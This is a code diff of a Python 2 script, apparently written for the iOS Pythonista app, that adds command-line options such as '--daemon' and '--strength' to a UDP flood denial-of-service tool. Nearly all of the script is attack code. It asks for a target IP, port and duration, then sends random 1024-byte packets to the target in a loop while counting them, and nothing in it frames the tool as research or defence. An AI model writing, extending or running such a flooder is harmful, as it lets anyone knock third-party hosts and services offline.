@@ -1,4 +1,24 @@
 import socket, sys, os, time, itertools, threading, speech, console
+
+import argparse
+parser = argparse.ArgumentParser()
+parser.add_argument("-d", "--daemon",help="Starts Daemon DOS",action="store_true")
+parser.add_argument("-s", "--strength",help="Controls How Strong The Attack Is (0-9)",type=int,default=1)
+parser.add_argument("-v", "--verbose",help="Detailed Startup",action="store_true")
+parser.add_argument("-r", "--rainbow",help="Rainbow Text!",action="store_true")
+parser.add_argument("-n", "--nohelp",help="Hides Help",action="store_true")
+parser.add_argument("-c", "--color",help="Change Color Theme",default="red")
+args = parser.parse_args()
+
+if not args.verbose:
+	if args.nohelp:
+		pass
+	else:
+		parser.print_help()
+
+daemon = args.daemon
+verbose = args.verbose
+
 console.set_font()
 console.set_color()
 if len(sys.argv) > 1:
@@ -37,24 +57,26 @@ else:
 	print "      -+--=:=-  sexy -=:=--+-"
 	console.set_color()
 	sys.exit()
-if sys.argv[2] == "blue":
+if args.color == "blue":
 	color = "blue"
-if sys.argv[2] == "red":
+if args.color == "red":
 	color = "red"
-if sys.argv[2] == "green":
+if args.color == "green":
 	color = "green"
-if sys.argv[2] == "yellow":
+if args.color == "yellow":
 	color = "yellow"
-if sys.argv[2] == "aqua":
+if args.color == "aqua":
 	color = "aqua"
-if sys.argv[2] == "sexy":
+if args.color == "sexy":
 	color = "sexy"
-if sys.argv[2] == "rainbow":
+if args.color == "rainbow":
 	color = "red"
-if int(sys.argv[1]) == 1:
+if len(sys.argv[1]) == 0:
 	import thelogo
-if sys.argv[2] == "debug":
+if verbose:
 	import APDOS_Debug
+if daemon:
+	import DaemonDos
 console.set_font('System-Bold', 15)
 print "###################################"
 try:
@@ -82,18 +104,18 @@ console.set_color()
 print "###################################"
 print ""
 console.set_font()
-if sys.argv[2] == "rainbow":
+if args.rainbow:
 	import random
 	console.set_color(130, 0, 0)
 	print "\n     -+--=:=-  -++-  -=:=--+-"
 	console.set_color()
 	console.set_font('HoeflerText-Black')
-	print " " * 32 + "SavageOfficial"
+	print " " * 32 + "SavageSecurity"
 	console.set_font()
 	console.set_color(130, 0, 0)
 	print "     -+--=:=-  -++-  -=:=--+-\n"
 	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	bytes = random._urandom(1024) * int(sys.argv[1])
+	bytes = random._urandom(1024) * args.strength
 	victim = raw_input(' -+- Target: ')
 	vport = input(' -+- Port: ')
 	duration = input(' -+- Run: ')
@@ -110,6 +132,7 @@ if sys.argv[2] == "rainbow":
 			else:
 				pass
 		except KeyboardInterrupt:
+			console.set_color()
 			sys.exit()
 		try:
 			client.sendto(bytes, (victim, vport))
@@ -126,6 +149,7 @@ if sys.argv[2] == "rainbow":
 			hue += 0.001
 			print "%s Packets: %s Port: %s " %(sent, victim, vport)
 		except KeyboardInterrupt:
+			console.set_color()
 			sys.exit()
 	console.set_color()
 	sys.exit()
